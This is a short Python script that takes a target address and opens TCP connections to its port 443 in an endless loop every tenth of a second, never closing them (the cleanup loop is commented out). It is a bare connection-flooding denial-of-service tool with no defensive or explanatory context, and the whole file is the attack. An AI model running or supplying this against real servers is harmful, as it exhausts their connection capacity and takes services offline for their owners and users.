import sys
import socket
from time import sleep

target = sys.argv[1]
port = 443
sockets = []
sock_counter = 0

while True:
    sockets.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
    sockets[sock_counter].connect((target, port))
    sock_counter += 1
    print("Connections open: {0}".format(sock_counter))
    sleep(0.1)

#for i in sockets:
#    sockets[i].close()
